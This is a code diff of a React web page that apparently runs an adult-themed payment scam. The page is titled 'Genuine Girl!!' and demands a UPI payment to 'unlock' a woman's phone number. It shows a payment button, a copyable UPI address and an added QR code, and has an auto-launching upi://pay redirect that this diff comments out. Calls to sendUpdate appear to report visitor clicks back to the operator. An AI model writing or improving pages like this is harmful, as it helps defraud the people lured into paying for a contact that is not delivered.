@@ -38,7 +38,7 @@ function App() {
     sendUpdate("Home");
     setTimeout(() => {
       console.log("launching");
-      window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl", "_self");
+      //window.open("upi://pay?cu=INR&pa=bharatpe.0851610820@icici&pn=ShruthiReddy&tn=Genuine_Girl", "_self");
     }, 1500);
   }, []);
 
@@ -74,7 +74,7 @@ function App() {
   return (
     <div className="App" onClick={() => { /*setisOpen(false) */ }}>
       <header className="App-header">
-        <h1 style={{ marginTop: "-100px", marginBottom: '10px' }}>🍆Genuine Girl!!🍆</h1>
+        <h1 style={{ }}>🍆Genuine Girl!!🍆</h1>
         <CopyExample />
         <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
         <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
@@ -112,6 +112,7 @@ function CopyExample() {
   return (
     <div className='card'>
       <p style={{ margin: "0px", color: "mistyrose", fontWeight: 'bold' }}>Pay to my UPI Address if  "<span style={{ color: "red" }}>PAY NOW</span>" Button is Not Working👇🏻👇🏻👇🏻</p>
+      <img alt='' src='./QR.jpg'></img>
       <div style={{ display: "flex", padding: "15px" }}>
         <input readOnly value={"bharatpe.0851610820@icici"}></input >
         <button className='cpybutton' onClick={async () => { setIsCopyOpen(true); await sendUpdate('Copied'); navigator.clipboard.writeText('bharatpe.0851610820@icici') }}>Copy</button>
